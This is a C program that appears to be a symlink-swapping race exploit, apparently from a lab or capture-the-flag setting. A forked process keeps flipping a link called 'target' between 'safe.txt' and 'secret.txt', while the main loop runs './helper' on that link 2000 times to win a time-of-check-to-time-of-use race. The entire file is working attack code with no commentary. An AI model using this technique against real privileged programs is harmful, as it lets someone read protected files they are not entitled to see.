#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <signal.h>
#include <errno.h>

#define SAFE   "safe.txt"
#define SECRET "secret.txt"
#define LINK   "target"

static void swap_loop(void) {
    for (;;) {
        unlink(LINK);
        if (symlink(SAFE, LINK) != 0) perror("symlink safe");
        unlink(LINK);
        if (symlink(SECRET, LINK) != 0) perror("symlink secret");
    }
}

int main(void) {
    pid_t swapper = fork();
    if (swapper < 0) { perror("fork"); return 1; }
    if (swapper == 0) {
        swap_loop();
        _exit(0);
    }

    usleep(10000); // let swapper start

    for (int i = 0; i < 2000; i++) {
        pid_t child = fork();
        if (child < 0) { perror("fork"); break; }
        if (child == 0) {
            char *args[] = {"./helper", LINK, NULL};
            execv("./helper", args);
            perror("execv");
            _exit(1);
        }
        int status;
        waitpid(child, &status, 0);
    }

    kill(swapper, SIGKILL);
    waitpid(swapper, NULL, 0);
    return 0;
}
